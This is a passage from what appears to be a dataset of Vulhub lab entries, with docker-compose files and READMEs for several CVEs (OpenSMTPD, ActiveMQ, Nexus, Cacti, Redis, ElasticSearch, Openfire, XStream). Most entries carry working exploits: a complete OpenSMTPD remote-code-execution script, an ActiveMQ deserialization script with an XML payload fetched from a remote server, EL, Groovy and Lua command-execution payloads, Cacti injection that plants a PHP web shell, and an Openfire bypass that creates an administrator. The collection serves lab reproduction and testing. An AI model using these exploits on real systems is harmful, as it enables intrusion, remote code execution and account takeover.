    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/opensmtpd/CVE-2020-7247/poc.py\n- /home/yay/pentest-agent/vulhub/sites_no_md/opensmtpd/CVE-2020-7247/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/opensmtpd/CVE-2020-7247/poc.py\n\n- Extension: .py\n- Language: python\n- Size: 1915 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```python\n# Exploit Title: OpenSMTPD 6.6.1 - Remote Code Execution\n# Date: 2020-01-29\n# Exploit Author: 1F98D\n# Original Author: Qualys Security Advisory\n# Vendor Homepage: https://www.opensmtpd.org/\n# Software Link: https://github.com/OpenSMTPD/OpenSMTPD/releases/tag/6.6.1p1\n# Version: OpenSMTPD < 6.6.2\n# Tested on: Debian 9.11 (x64)\n# CVE: CVE-2020-7247\n# References:\n# https://www.openwall.com/lists/oss-security/2020/01/28/3\n#\n# OpenSMTPD after commit a8e222352f and before version 6.6.2 does not adequately\n# escape dangerous characters from user-controlled input. An attacker\n# can exploit this to execute arbitrary shell commands on the target.\n# \n#!/usr/local/bin/python3\n\nfrom socket import *\nimport sys\n\nif len(sys.argv) != 4:\n    print('Usage {} <target ip> <target port> <command>'.format(sys.argv[0]))\n    print(\"E.g. {} 127.0.0.1 25 'touch /tmp/x'\".format(sys.argv[0]))\n    sys.exit(1)\n\nADDR = sys.argv[1]\nPORT = int(sys.argv[2])\nCMD = sys.argv[3]\n\ns = socket(AF_INET, SOCK_STREAM)\ns.connect((ADDR, PORT))\n\nres = s.recv(1024)\nif 'OpenSMTPD' not in str(res):\n    print('[!] No OpenSMTPD detected')\n    print('[!] Received {}'.format(str(res)))\n    print('[!] Exiting...')\n    sys.exit(1)\n\nprint('[*] OpenSMTPD detected')\ns.send(b'HELO x\\r\\n')\nres = s.recv(1024)\nif '250' not in str(res):\n    print('[!] Error connecting, expected 250')\n    print('[!] Received: {}'.format(str(res)))\n    print('[!] Exiting...')\n    sys.exit(1)\n\nprint('[*] Connected, sending payload')\ns.send(bytes('MAIL FROM:<;{};>\\r\\n'.format(CMD), 'utf-8'))\nres = s.recv(1024)\nif '250' not in str(res):\n    print('[!] Error sending payload, expected 250')\n    print('[!] Received: {}'.format(str(res)))\n    print('[!] Exiting...')\n    sys.exit(1)\n\nprint('[*] Payload sent')\ns.send(b'RCPT TO:<root>\\r\\n')\ns.recv(1024)\ns.send(b'DATA\\r\\n')\ns.recv(1024)\ns.send(b'\\r\\nxxx\\r\\n.\\r\\n')\ns.recv(1024)\ns.send(b'QUIT\\r\\n')\ns.recv(1024)\nprint('[*] Done')\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/opensmtpd/CVE-2020-7247/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 97 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nversion: '2'\nservices:\n  smtpd:\n    image: vulhub/opensmtpd:6.6.1p1\n    ports:\n      - \"8825:25\"\n\n```\n\n",
    "readme": "# OpenSMTPD Remote Code Execution Vulnerability (CVE-2020-7247)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nOpenSMTPD is an smtp service program for unix operating systems (BSD, MacOS, GNU/Linux), following the RFC 5321 SMTP protocol. OpenSMTPD was originally developed for the OpenBSD operating system and is part of the OpenBSD project. Due to its open source properties, Distributed to other unix platforms. According to the ISC license, the software is free for everyone to use and reuse.\n\n`CVE-2020-7247` is caused by OpenSMTPD's lax verification of the sender/recipient in the process of implementing RFC 5321.\n\nOn January 29, 2020, OpenSMTPD group officially submitted a fix for the `CVE-2020-7247` in the GitHub repository. After the repair, the corresponding version is `OpenSMTPD 6.6.2p1`.\n\n**Reference：**\n\n- https://www.qualys.com/2020/01/28/cve-2020-7247/lpe-rce-opensmtpd.txt\n- https://www.exploit-db.com/exploits/47984\n- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7247\n- https://www.anquanke.com/post/id/197689\n\n## Start Vulnerability Application\n\nStart a vulnerable OpenSMTPD through following command:\n\n```\ndocker compose up -d\n```\n\nAfter SMTPD server is started, connect to the 8825 port and get the result (`44dadcc5a6eb` is the container ID):\n\n```\n$ nc <your-ip> 8825 -v\n220 44dadcc5a6eb ESMTP OpenSMTPD\n```\n\n## Vulnerability Reproduce\n\nUse [Exploit-DB](https://www.exploit-db.com/exploits/47984) to gain a reverse shell:\n\n```\npython3 poc.py your-ip 8825 <command> \n```\n\n![image](https://github.com/CatAndCoffee/vulhub/blob/CVE-2020-7247/OpenSMTPD/CVE-2020-7247/image-20210415233036042.png)\n"
  },
  {
    "filename": "CVE-2023-46604.md",
    "filenamenomd": "CVE-2023-46604",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/activemq/CVE-2023-46604/poc.py\n- /home/yay/pentest-agent/vulhub/sites_no_md/activemq/CVE-2023-46604/poc.xml\n- /home/yay/pentest-agent/vulhub/sites_no_md/activemq/CVE-2023-46604/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/activemq/CVE-2023-46604/poc.py\n\n- Extension: .py\n- Language: python\n- Size: 1278 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```python\nimport io\nimport socket\nimport sys\n\n\ndef main(ip, port, xml):\n    classname = \"org.springframework.context.support.ClassPathXmlApplicationContext\"\n    socket_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    socket_obj.connect((ip, port))\n\n    with socket_obj:\n        out = socket_obj.makefile('wb')\n        # out = io.BytesIO()  # 创建一个内存中的二进制流\n        out.write(int(32).to_bytes(4, 'big'))\n        out.write(bytes([31]))\n        out.write(int(1).to_bytes(4, 'big'))\n        out.write(bool(True).to_bytes(1, 'big'))\n        out.write(int(1).to_bytes(4, 'big'))\n        out.write(bool(True).to_bytes(1, 'big'))\n        out.write(bool(True).to_bytes(1, 'big'))\n        out.write(len(classname).to_bytes(2, 'big'))\n        out.write(classname.encode('utf-8'))\n        out.write(bool(True).to_bytes(1, 'big'))\n        out.write(len(xml).to_bytes(2, 'big'))\n        out.write(xml.encode('utf-8'))\n        # print(list(out.getvalue()))\n        out.flush()\n        out.close()\n\n\nif __name__ == \"__main__\":\n    if len(sys.argv) != 4:\n        print(\"Please specify the target and port and poc.xml: python3 poc.py 127.0.0.1 61616 \"\n              \"http://192.168.0.101:8888/poc.xml\")\n        exit(-1)\n    main(sys.argv[1], int(sys.argv[2]), sys.argv[3])\n\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/activemq/CVE-2023-46604/poc.xml\n\n- Extension: .xml\n- Language: xml\n- Size: 579 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n<beans xmlns=\"http://www.springframework.org/schema/beans\"\n       xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n       xsi:schemaLocation=\"http://www.springframework.org/schema/beans\n       http://www.springframework.org/schema/beans/spring-beans.xsd\">\n    <bean id=\"pb\" class=\"java.lang.ProcessBuilder\" init-method=\"start\">\n        <constructor-arg>\n            <list>\n                <value>touch</value>\n                <value>/tmp/activeMQ-RCE-success</value>\n            </list>\n        </constructor-arg>\n    </bean>\n</beans>\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/activemq/CVE-2023-46604/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 133 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 18:41:15\n\n### Code\n\n```yaml\nversion: '2'\nservices:\n activemq:\n   image: vulhub/activemq:5.17.3\n   ports:\n    - \"61616:61616\"\n    - \"8161:8161\"\n    - \"5005:5005\"\n\n```\n\n",
    "readme": "# Apache ActiveMQ OpenWire Protocol Deserialization RCE (CVE-2023-46604)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nApache ActiveMQ is an open source messaging middleware developed by the American Pachitea (Apache) Software Foundation that supports Java messaging services, clustering, Spring framework, and more.\n\nOpenWire protocol is designed by ActiveMQ, to allow native access to ActiveMQ from a number of different languages and platforms. Apache ActiveMQ prior to 5.18.2 was affected by a deserialization vulnerability. This vulnerability may allow remote attackers with network access privileges to execute arbitrary shell commands by manipulating the serialized class types in the OpenWire protocol, leading to the instantiation of any class on the classpath of the agent.\n\nReferences:\n\n- <https://activemq.apache.org/news/cve-2023-46604>\n- <https://xz.aliyun.com/t/12929>\n- <https://boogipop.com/2023/11/03/Apache%20ActiveMQ%20CVE-2023-46604%20RCE%20%E5%88%86%E6%9E%90/>\n- <https://forum.butian.net/share/2566>\n\n## Environment setup\n\nActiveMQ listens to following 2 ports:\n\n| Default port | Default Condition                    |\n|--------------|--------------------------------------|\n| 8161 (web)   | Remote access requires configuration |\n| 61616 (tcp)  | Remote access allowed                |\n\nThe deserialization issue exists in the port 61616.\n\nEnter following commands to run a ActiveMQ 5.17.3 server:\n\n```\ndocker compose up -d\n```\n\nPlease access `http://your-ip:8161` to confirm that the service has started successfully before exploitation, although we only need to use the port 61616 after that.\n\n## Exploit\n\nYou can quickly start an HTTP server in the folder where the [poc.xml](poc.xml) file is located using the Python3 http.server module:\n\n```shell\npython3 -m http.server 6666\n```\n\nThen execute the [poc.py](poc.py):\n\n```shell\npython3 poc.py target port http://ip of http server/poc.xml\n```\n\nYou can check inside the ActiveMQ container using the following command:\n\n```\ndocker exec cve-2023-46604-activemq-1 ls -l /tmp\n```\n\nIf you see the output showing that touch /tmp/activeMQ-RCE-success has been executed successfully, then the exploit has worked.\n\n![01.png](01.png)\n"
  },
  {
    "filename": "CVE-2021-43008.md",
    "filenamenomd": "CVE-2021-43008",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/adminer/CVE-2021-43008/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/adminer/CVE-2021-43008/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 86 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 18:41:15\n\n### Code\n\n```yaml\nversion: '2'\nservices:\n web:\n   image: vulhub/adminer:4.6.2\n   ports:\n    - \"8080:80\"\n\n```\n\n",
    "readme": "# Adminer Remote Arbitrary File Read (CVE-2021-43008)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nAdminer is a tool for managing content in databases developed by PHP. It natively supports MySQL, MariaDB, PostgreSQL, SQLite, MS SQL, Oracle, Elasticsearch and MongoDB.\n\nImproper Access Control in Adminer versions 1.12.0 to 4.6.2 (fixed in version 4.6.3) allows an attacker to achieve Arbitrary File Read on the remote server by requesting the Adminer to connect to a remote MySQL database.\n\nReferences:\n\n- <https://github.com/p0dalirius/CVE-2021-43008-AdminerRead>\n- <http://sansec.io/research/adminer-4.6.2-file-disclosure-vulnerability>\n\n## Vulnerable environment\n\nExecute following command to start a PHP server with Adminer 4.6.2:\n\n```\ndocker compose up -d\n```\n\nAfter the server is started, you can see the login page of Adminer at `http://your-ip:8080`.\n\n## Exploit\n\nStart a roguo MySQL server through [mysql-fake-server](https://github.com/4ra1n/mysql-fake-server), then paste the `fileread_/etc/passwd` into username field:\n\n![](1.png)\n\nReceive the request and the `/etc/passwd` has been written into current directory:\n\n![](2.png)\n"
  },
  {
    "filename": "CVE-2020-10204.md",
    "filenamenomd": "CVE-2020-10204",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/nexus/CVE-2020-10204/admin.password\n- /home/yay/pentest-agent/vulhub/sites_no_md/nexus/CVE-2020-10204/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/nexus/CVE-2020-10204/admin.password\n\n- Extension: .password\n- Language: unknown\n- Size: 5 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```unknown\nadmin\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/nexus/CVE-2020-10204/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 168 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nversion: '3'\nservices:\n web:\n   image: vulhub/nexus:3.21.1\n   ports:\n    - \"8081:8081\"\n    - \"5005:5005\"\n   volumes: \n    - ./admin.password:/nexus-data/admin.password\n\n```\n\n",
    "readme": "# Nexus Repository Manager 3 Authenticated Remote Code Execution (CVE-2020-10204)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nNexus Repository Manager is a repository manager that organizes, stores and distributes artifacts needed for development.\n\nIn the version <= 3.21.1, a EL injection vulnerability has been discovered that allows for an attacker with an administrative account on Nexus Repository to execute arbitrary code by crafting a malicious request to Nexus Repository. This issue is patch bypass of CVE-2018-16621.\n\nReferences:\n\n- https://support.sonatype.com/hc/en-us/articles/360044356194-CVE-2020-10204-Nexus-Repository-Manager-3-Remote-Code-Execution-2020-03-31\n- https://github.com/threedr3am/learnjavabug/blob/93d57c4283/nexus/CVE-2020-10204/README.md\n- https://github.com/jas502n/CVE-2020-10199\n\n## Vulnerable environment\n\nExecute following command to start a Nexus Repository Manager version 3.21.1:\n\n```\ndocker compose up -d\n```\n\nAfter the server is started, browse `http://your-ip:8081` to see the home page of Nexus. Login the admin panel with administrator account `admin:admin` and finish the initialize wizard.\n\n## Exploit\n\nCopy your cookie and CSRF token then send following request:\n\n```\nPOST /service/extdirect HTTP/1.1\nHost: your-ip\nContent-Length: 223\nX-Requested-With: XMLHttpRequest\nX-Nexus-UI: true\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36\nNX-ANTI-CSRF-TOKEN: [csrf-token]\nContent-Type: application/json\nAccept: */*\nOrigin: http://192.168.1.3:8081\nReferer: http://192.168.1.3:8081/\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nCookie: NX-ANTI-CSRF-TOKEN=[csrf-token]; NXSESSIONID=[sessionid]\nConnection: close\n\n{\"action\":\"coreui_User\",\"method\":\"update\",\"data\":[{\"userId\":\"admin\",\"version\":\"2\",\"firstName\":\"admin\",\"lastName\":\"User\",\"email\":\"admin@example.org\",\"status\":\"active\",\"roles\":[\"nxadmin$\\\\B{233*233}\"]}],\"type\":\"rpc\",\"tid\":11}\n```\n\nAs you can see, EL expression `233*233` is executed:\n\n![](1.png)\n\nRefer to <https://github.com/jas502n/CVE-2020-10199>, use EL expression payload `$\\\\A{''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(null).exec('touch /tmp/success')}` to execute command `touch /tmp/success`:\n\n![](2.png)\n"
  },
  {
    "filename": "CVE-2025-24367.md",
    "filenamenomd": "CVE-2025-24367",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/cacti/CVE-2025-24367/entrypoint.sh\n- /home/yay/pentest-agent/vulhub/sites_no_md/cacti/CVE-2025-24367/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/cacti/CVE-2025-24367/entrypoint.sh\n\n- Extension: .sh\n- Language: bash\n- Size: 613 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```bash\n#!/bin/bash\nset -ex\n\nwait-for-it db:3306 -t 300 -- echo \"database is connected\"\nif [[ ! $(mysql --host=db --user=root --password=root cacti -e \"show tables\") =~ \"automation_devices\" ]]; then\n    mysql --host=db --user=root --password=root cacti < /var/www/html/cacti.sql\n    mysql --host=db --user=root --password=root cacti -e \"UPDATE user_auth SET must_change_password='' WHERE username = 'admin'\"\n    mysql --host=db --user=root --password=root cacti -e \"SET GLOBAL time_zone = 'UTC'\"\nfi\n\ncron\n\n# first arg is `-f` or `--some-option`\nif [ \"${1#-}\" != \"$1\" ]; then\n\tset -- apache2-foreground \"$@\"\nfi\n\nexec \"$@\"\n\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/cacti/CVE-2025-24367/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 444 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nservices:\n  web:\n    image: vulhub/cacti:1.2.28\n    ports:\n     - \"8080:80\"\n    depends_on:\n     - db\n    entrypoint:\n     - bash\n     - /entrypoint.sh\n    volumes:\n     - ./entrypoint.sh:/entrypoint.sh\n    command: apache2-foreground\n  db:\n   image: mysql:5.7\n   environment:\n    - MYSQL_ROOT_PASSWORD=root\n    - MYSQL_DATABASE=cacti\n   command: --character-set-server=utf8mb4 --collation-server=utf8mb4_unicode_ci\n   ports:\n    - \"3306:3306\"\n\n```\n\n",
    "readme": "# Cacti RRDTool Post-Auth Argument Injection Leads to RCE (CVE-2025-24367)\n\n[中文版本(Chinese version)](./README.zh-cn.md)\n\nCacti is a complete network graphing solution designed to harness the power of RRDTool's data storage and graphing functionality. Versions of Cacti up to 1.2.28 have a argument injection vulnerability that allows authenticated users to create arbitrary PHP files on the web server, potentially leading to remote code execution.\n\nThe vulnerability occurs in the graph template functionality where user input for RRDTool command parameters, such as `--right-axis-label`, is not properly sanitized. While Cacti attempts to escape shell metacharacters using `cacti_escapeshellarg()`, it fails to handle newline characters. This allows attackers to break out of the intended command context and inject additional RRDTool commands, resulting in the ability to write malicious PHP files to the web root.\n\nReferences:\n\n- <https://github.com/Cacti/cacti/security/advisories/GHSA-fxrq-fr7h-9rqq>\n- <https://github.com/Cacti/cacti/commit/c7e4ee798d263a3209ae6e7ba182c7b65284d8f0>\n\n## Environment Setup\n\nExecute the following command to start Cacti 1.2.28:\n\n```\ndocker compose up -d\n```\n\nAfter the service is started, you can access http://your-ip:8080 to visit Cacti. The default credentials are admin/admin.\n\nLog in as admin and follow the initialization instructions. Simply click the \"Next\" button repeatedly until you see the success page.\n\n## Vulnerability Reproduction\n\nFirst, you need to log in to Cacti. On the Cacti console, navigate to \"Console → Templates → Graph\" and find the \"PING - Advanced Ping\" template and edit it. Submit and capture the request, then modify the `right_axis_label` parameter to the following payload (please take care of the line breaks `%0a`):\n\n```\nXXX\ncreate my.rrd --step 300 DS:temp:GAUGE:600:-273:5000 RRA:AVERAGE:0.5:1:1200\ngraph vulhub.php -s now -a CSV DEF:out=my.rrd:temp:AVERAGE LINE1:out:<?=phpinfo();?>\n```\n\n![](1.png)\n\nThen, navigate to \"Console → Create → New Graphs\" and create a new graph with the \"PING - Advanced Ping\" template:\n\n![](2.png)\n\nAfter that, navigate to \"Graphs → Default Tree → Local Linux Machine\" to trigger the payload execution.\n\n![](3.png)\n\nYou will see an image with error message \"Error: creating arguments\", which means the payload has been executed.\n\nOur payload will create two files: a RRD file (my.rrd) and a PHP web shell (vulhub.php) in the Cacti web root:\n\n![](4.png)\n"
  },
  {
    "filename": "CVE-2022-0543.md",
    "filenamenomd": "CVE-2022-0543",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/redis/CVE-2022-0543/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/redis/CVE-2022-0543/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 88 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nversion: '2'\nservices:\n redis:\n   image: vulhub/redis:5.0.7\n   ports:\n    - \"6379:6379\"\n\n```\n\n",
    "readme": "# Redis Lua Sandbox Escape and Remote Code Execution (CVE-2022-0543)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nRedis is an open source (BSD licensed), in-memory data structure store, used as a database, cache, and message broker.\n\nReginaldo Silva discovered that due to a packaging issue on Debian/Ubuntu, a remote attacker with the ability to execute arbitrary Lua scripts could possibly escape the Lua sandbox and execute arbitrary code on the host.\n\nReferences:\n\n- <https://www.ubercomp.com/posts/2022-01-20_redis_on_debian_rce>\n- <https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1005787>\n\n## Vulnerability Environment\n\nExecute following command to start a redis server 5.0.7 on Ubuntu:\n\n```\ndocker compose up -d\n```\n\nAfter server is started, you can connect to this server without credentials by `redis-cli`:\n\n```\nredis-cli -h your-ip\n```\n\n## Exploit\n\nThis vulnerability existed because the Lua library in Debian/Ubuntu is provided as a dynamic library. A `package` variable was automatically populated that in turn permitted access to arbitrary Lua functionality.\n\nAs this extended to, for example, you can use `package.loadlib` to load the modules from liblua, then use this module to execute the commands:\n\n```lua\nlocal io_l = package.loadlib(\"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\", \"luaopen_io\");\nlocal io = io_l();\nlocal f = io.popen(\"id\", \"r\");\nlocal res = f:read(\"*a\");\nf:close();\nreturn res\n```\n\nNoted that you should specify a correct realpath for the `liblua` library. In this Vulhub environment (Ubuntu focal), the value is `/usr/lib/x86_64-linux-gnu/liblua5.1.so.0`.\n\nEval this script in redis shell:\n\n```lua\neval 'local io_l = package.loadlib(\"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\", \"luaopen_io\"); local io = io_l(); local f = io.popen(\"id\", \"r\"); local res = f:read(\"*a\"); f:close(); return res' 0\n```\n\nExecute the commands successful:\n\n![](1.png)\n"
  },
  {
    "filename": "CVE-2015-1427.md",
    "filenamenomd": "CVE-2015-1427",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/elasticsearch/CVE-2015-1427/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/elasticsearch/CVE-2015-1427/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 97 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 18:41:15\n\n### Code\n\n```yaml\nservices:\n es:\n   image: vulhub/elasticsearch:1.4.2\n   ports:\n    - \"9200:9200\"\n    - \"9300:9300\"\n```\n\n",
    "readme": "# ElasticSearch Groovy Sandbox Bypass and Remote Code Execution (CVE-2015-1427)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nElasticSearch is a distributed, RESTful search and analytics engine.\n\nElasticSearch versions prior to 1.3.8 and 1.4.3 contain a vulnerability in the Groovy scripting engine that allows attackers to bypass the sandbox protection and execute arbitrary code on the server.\n\nAfter [CVE-2014-3120](../CVE-2014-3120/), ElasticSearch changed its default dynamic scripting language to Groovy and added a sandbox. However, dynamic language execution remained enabled by default. This vulnerability involves:\n\n1. A sandbox bypass\n2. A Groovy code execution vulnerability\n\nElasticSearch supports using \"sandboxed\" Groovy language as a dynamic scripting engine. However, the sandbox implementation was insufficient. Two methods for command execution were discovered:\n\n1. Lupin's method: Bypass the Java sandbox using reflection\n2. Tang3's method: Use Groovy language features to execute commands directly, without using Java\n\nBased on these approaches, we have two different POCs.\n\nJava sandbox bypass method:\n\n```groovy\njava.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getText()\n```\n\nGroovy direct command execution method:\n\n```groovy\ndef command='id';def res=command.execute().text;res\n```\n\nReferences:\n\n- <http://jordan-wright.com/blog/2015/03/08/elasticsearch-rce-vulnerability-cve-2015-1427/>\n- <https://github.com/XiphosResearch/exploits>\n- <http://cb.drops.wiki/drops/papers-5107.html>\n- <http://cb.drops.wiki/drops/papers-5142.html>\n\n## Environment Setup\n\nExecute the following commands to start a 1.4.2 version ElasticSearch server:\n\n```\ndocker compose up -d\n```\n\nAfter the server starts, you can access the ElasticSearch server at `http://your-ip:9200`.\n\n## Vulnerability Reproduction\n\nSince querying requires at least one document in the index, first send the following request to add data:\n\n```\nPOST /website/blog/ HTTP/1.1\nHost: your-ip:9200\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 25\n\n{\n  \"name\": \"test\"\n}\n```\n\nThen send a request containing the payload to execute arbitrary commands:\n\n```\nPOST /_search?pretty HTTP/1.1\nHost: your-ip:9200\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\nConnection: close\nContent-Type: application/text\nContent-Length: 156\n\n{\"size\":1, \"script_fields\": {\"lupin\":{\"lang\":\"groovy\",\"script\": \"java.lang.Math.class.forName(\\\"java.lang.Runtime\\\").getRuntime().exec(\\\"id\\\").getText()\"}}}\n```\n\nThe command execution result will be returned in the response:\n\n![](1.png)\n"
  },
  {
    "filename": "CVE-2023-32315.md",
    "filenamenomd": "CVE-2023-32315",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/openfire/CVE-2023-32315/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/openfire/CVE-2023-32315/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 89 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nversion: '3'\nservices:\n web:\n   image: vulhub/openfire:4.7.4\n   ports:\n    - \"9090:9090\"\n\n```\n\n",
    "readme": "# Openfire Admin Console Authentication Bypass (CVE-2023-32315)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nOpenfire is a real time collaboration (RTC) server licensed under the Open Source Apache License. It uses the only widely adopted open protocol for instant messaging, XMPP (also called Jabber).\n\nIn the version prior to 4.7.4 and 4.6.7, Openfire's administrative console (the Admin Console), a web-based application, was found to be vulnerable to a path traversal attack via the setup environment. This permitted an unauthenticated user to use the unauthenticated Openfire Setup Environment in an already configured Openfire environment to access restricted pages in the Openfire Admin Console reserved for administrative users.\n\nReferences:\n\n- <https://github.com/igniterealtime/Openfire/security/advisories/GHSA-gw42-f939-fhvm>\n- <https://mp.weixin.qq.com/s/EzfB8CM4y4aNtKFJqSOM1w>\n\n## Vulnerable Environment\n\nExecute following command to start a Openfire server 4.7.4:\n\n```\ndocker compose up -d\n```\n\nAfter the server is started, open the link `http://your-ip:9090` then you will be redirected to login page if you don't have the authentication.\n\n## Exploit\n\nMore than a decade ago, an path traversal issue was found in Openfire admin console, CVE-2008-6508. Attackers are able to use the `/setup/setup-/../../[page].jsp` to bypass the authentication checks and visit arbitratry page without knowning the admin username and password.\n\nSince then the path traversal protections were already in place to protect against exactly this kind of attack.\n\nA later upgrade of the embedded webserver included support for non-standard URL encoding of UTF-16 characters. The path traversal protections in place in Openfire were not updated to include protection against this new encoding. So attackers are able to use the `/setup/setup-/%u002e%u002e/%u002e%u002e/[page].jsp` to bypass the path traversal protection again.\n\nTo exploit this issue, the first step is to create a new administrator through following request:\n\n```\nGET /setup/setup-s/%u002e%u002e/%u002e%u002e/user-create.jsp?csrf=csrftoken&username=hackme&name=&email=&password=hackme&passwordConfirm=hackme&isadmin=on&create=Create+User HTTP/1.1\nHost: localhost:9090\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en-US;q=0.9,en;q=0.8\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.91 Safari/537.36\nConnection: close\nCache-Control: max-age=0\nCookie: csrf=csrftoken\n\n\n```\n\nAlthough an exception is raised in response but an account with both username and password \"hackme\" is created.\n\n![](1.png)\n\nThen log in to the admin console with this account, and you can see that `hackme` is already an administrator.\n\n![](2.png)\n"
  },
  {
    "filename": "CVE-2021-21351.md",
    "filenamenomd": "CVE-2021-21351",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/xstream/CVE-2021-21351/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/xstream/CVE-2021-21351/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 89 bytes\n- Created: 2025-04-26 21:29:54\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nversion: '2'\nservices:\n web:\n   image: vulhub/xstream:1.4.15\n   ports:\n    - \"8080:8080\"\n\n```\n\n",
    "readme": "# XStream Deserialization Remote Command Execution (CVE-2021-21351)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nXStream is a simple library to serialize objects to XML and back again.\n\nXStream uses a blocklist mechanism when parsing XML text which is utilized to defend against deserialization vulnerabilities, but in 1.4.15 and earlier, blocklists are incomplete and attackers could use `javax.naming.ldap.Rdn$RdnEntry` and `javax.sql.rowset.BaseRowSet` to make an JNDI injection and execute arbitrary commands finally.\n\nReference links.\n\n- https://x-stream.github.io/CVE-2021-21351.html\n- https://paper.seebug.org/1543/\n- https://www.veracode.com/blog/research/exploiting-jndi-injections-java\n- https://github.com/welk1n/JNDI-Injection-Exploit/\n\n## Vulnerable Environment\n\nStart a Springboot + XStream 1.4.15 server.\n\n```\ndocker compose up -d\n```\n\nOnce the environment is started, you can send the following request to `http://your-ip:8080` to test if the server has started successfully\n\n![](1.png)\n\n## POC\n\nSince the target Java version is higher than 8u191, you need the help of `org.apache.naming.factory.BeanFactory` with EL expression injection to execute arbitrary commands, reference to [this article](https://www.veracode.com/blog/research/exploiting-jndi-injections-java).\n\nYou can use the [Java Chains](https://github.com/vulhub/java-chains) for vulnerability replication. Refer to the [Quick Start](https://java-chains.vulhub.org/docs/guide) to launch Java Chains. Afterwards, according to the image below, select to set the command to execute as `touch /tmp/success`, and generate the JNDI LDAP URL Payload:\n\n![](2.png)\n\nUse the above LDAP URL as the value of `<dataSource>` to construct the POC as 